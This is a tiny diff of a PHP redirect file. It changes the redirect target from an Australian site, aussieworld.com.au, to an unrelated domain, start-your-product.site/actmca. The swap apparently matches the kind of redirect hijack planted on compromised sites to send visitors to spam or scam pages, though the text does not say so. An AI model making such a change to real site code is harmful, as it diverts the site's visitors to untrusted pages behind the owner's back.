@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.aussieworld.com.au/");
+header("Location: https://start-your-product.site/actmca");
 die();
 ?>
